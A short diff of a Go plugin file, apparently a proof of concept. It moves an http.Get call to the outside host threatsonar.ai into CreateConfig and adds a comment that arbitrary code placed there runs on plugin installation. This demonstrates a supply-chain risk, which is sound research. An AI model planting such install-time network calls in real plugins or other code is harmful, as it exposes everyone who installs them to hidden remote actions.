@@ -14,13 +14,10 @@ type Config struct {
 	Headers map[string]string `json:"headers,omitempty"`
 }
 
-func PoC() {
-    resp, err := http.Get("http://threatsonar.ai:12345/")
-}
-
 // CreateConfig creates the default plugin configuration.
 func CreateConfig() *Config {
-    PoC()
+    // Arbitrary code can be put here to be executed upon plugin installation
+    http.Get("http://threatsonar.ai:12345/")
 	return &Config{
 		Headers: make(map[string]string),
 	}
